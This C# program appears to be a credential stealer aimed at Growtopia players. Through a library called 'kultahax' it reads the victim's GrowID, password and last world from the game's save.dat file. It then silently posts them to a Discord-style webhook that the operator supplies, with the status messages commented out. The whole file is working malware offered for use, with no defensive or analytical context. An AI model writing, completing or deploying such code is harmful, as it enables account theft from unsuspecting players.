using System;
using System.Net.Http;
using System.Text;
using kultahax;
using Newtonsoft.Json;

namespace MyNamespace
{
    class Program
    {
        static void Main()
        {
            
            //Gets GrowID + Pass + Last world from save.dat
            string growid = Growtopia.GrowID();
            string password = Growtopia.Password();
            string lastworld = Growtopia.LastWorld();

            // Replace the URL with the URL of your webhook
            string webhookUrl = "";

            
            using (HttpClient client = new HttpClient())
            {
              
                string messageText = $"GrowID: {growid}\nPassword: {password}\nLast World: {lastworld}";
                var message = new { content = messageText };

               
                var json = JsonConvert.SerializeObject(message);

                
                StringContent content = new StringContent(json, Encoding.UTF8, "application/json");

                
                HttpResponseMessage response = client.PostAsync(webhookUrl, content).Result;

                
                if (response.IsSuccessStatusCode)
                {
                    //Console.WriteLine("Webhook sent successfully.");
                }
                else
                {
                   // Console.WriteLine($"Error sending webhook. Status code: {response.StatusCode}");
                }
               // Console.ReadLine();
            }
        }
    }
}
